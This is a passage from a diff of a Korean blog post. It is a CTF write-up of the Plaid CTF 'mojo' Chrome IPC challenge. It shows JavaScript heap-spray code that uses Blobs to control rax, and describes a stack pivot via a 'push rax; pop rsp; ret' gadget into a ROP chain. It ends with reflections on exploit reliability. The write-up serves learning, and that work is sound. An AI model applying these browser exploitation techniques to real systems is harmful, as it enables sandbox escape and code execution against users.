+<p>위 코드는 rop chain이 있는 heap 메모리를 얻어야 하는 상황처럼 알고있는 주소에 원하는 값이 있어야 할때 사용했다. PlaidStoreImpl를 할당할 때 원하는 크기에 원하는 값이 있는 uint8_t vector가 같이 할당되기 때문에 그걸 여러번 할당하고 free한 뒤 vector가 가지고 있는 특정 패턴으로 heap pointer를 찾아냈다. 이것을 통해 “/flag_printer” 문자열과 rop chain이 있는 heap memory 주소를 알아왔다.</p>
+
+<h3 id="3-heap-spray를-통해-rax-조작하기">3. heap spray를 통해 rax 조작하기</h3>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">spray_blobs</span><span class="p">(</span><span class="nx">size</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">c</span><span class="p">)</span> <span class="nx">c</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">A</span><span class="dl">'</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">z_small</span><span class="dl">'</span><span class="o">+</span><span class="nx">blob_cnt</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">s</span><span class="p">]);</span>
+    <span class="kd">var</span> <span class="nx">bary</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">n</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">bary</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">c</span> <span class="k">instanceof</span> <span class="nb">ArrayBuffer</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// make a copy</span>
+            <span class="c1">// w64(ab, ab.byteLength - 8, i);</span>
+            <span class="nx">bary</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">xxxxxxxx</span><span class="dl">'</span><span class="p">;</span>
+            <span class="nx">s</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">size</span><span class="o">-</span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+            <span class="nx">bary</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">blob_spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">(</span><span class="nx">bary</span><span class="p">));</span>
+    <span class="nx">blob_cnt</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>다음으로 rax를 조작하기 위해 Blob을 이용해서 heap spray를 했다. 꼭 Blob을 사용하지 않더라도 PlaidStoreImpl에 있는 uint8_t vector로도 spray는 가능했을 것 같다.</p>
+
+<h3 id="4-stack-피벗-이후-rop">4. stack 피벗 이후 rop</h3>
+
+<p>stack 피벗을 위해 여러 가젯들을 찾아보았는데 마침 chrome 바이너리에 <code class="highlighter-rouge">push rax; pop rsp; ret</code> 가젯이 있었다. 이 가젯을 통해 rax를 rsp로 변경하여 rop chain을 호출할 수 있었다.</p>
+
+<h1 id="3-conclusion">3. Conclusion</h1>
+
+<p>mojo 문제를 풀면서 chrome ipc 구조에 꽤 많은것을 알게 되었다. 그리고 지금생각해보면 spray나 취약점을 트리거 하는 과정에서 비효율적인 코드들이 너무 많아   exploit reliability 가 낮았다고 생각한다.</p>
+
+<p>실제 대회에서 이 문제를 못푼 이유가 rax 컨트롤이 거의 0.01% 확률로 성공해서 디버깅이 매우 힘들었기 때문이다. 좀 더 시간이 많았다면 다시 처음부터 코드를 작성해 효율적인 exploit을 작성할 수 있었을것 같다.</p>
+
+<p>위에서 시도한 방법 말고 여러 write-up에 좋은 exploit 방법들이 많으니 추가적으로 exploit에 대해 궁금한 점이 있다면 다른 문서들을 참고해 보는게 좋을 것 같다.</p>
+
+   </div>
 </div>
 
 
@@ -455,20 +817,19 @@ End disqus -->
 
 <div class="pagination">
   
-	<a href="/2020-04-01/SMBGhost" class="left arrow">&#8592;</a>
+   <a href="/2020-04-01/SMBGhost" class="left arrow">&#8592;</a>
   
   
-	<a href="/2020-04-01/Plaid-CTF-Catalog" class="right arrow">&#8594;</a>
+   <a href="/2020-04-01/Plaid-CTF-Catalog" class="right arrow">&#8594;</a>
   
 
   <a href="#" class="top">Top</a>
 </div>
-
     </main>
 
     <!--footer>
   <span>
-    &copy; <time datetime="2020-08-11 07:00:51 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+    &copy; <time datetime="2020-09-02 00:58:48 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
   </span>
 </footer-->
 
